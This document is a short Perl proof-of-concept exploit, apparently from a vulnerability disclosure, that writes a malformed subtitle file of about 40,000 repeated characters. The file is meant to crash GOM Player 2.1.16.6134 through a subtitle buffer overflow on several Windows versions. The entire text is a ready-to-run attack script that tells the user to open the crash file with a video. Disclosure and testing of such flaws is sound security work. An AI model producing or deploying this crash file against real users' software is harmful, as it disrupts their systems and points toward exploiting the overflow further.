#!/usr/local/bin/perl

##################################################################
#
#	Title : GOM Player Subtitle Buffer Overflow Vulnerabiltity
#	Discovery by : Bui Quang Minh
#	Tested : GOM Player 2.1.16.6134
#	Reference : Bkis [http://security.bkis.vn/?p=501]
#	PoC : Windows XP (Silently Crash) and Windows Vista, Windows 7.
#	
##################################################################

my $buffer = "A" x 10240 x 4;
my $filename = "gomdos.srt";
open (FILE,">$filename") || die "\nCan't open $file: $!";
print FILE "$buffer";
close (FILE);
print "\nSuccessfully!\n\nPlease try $filename with a video file!\n";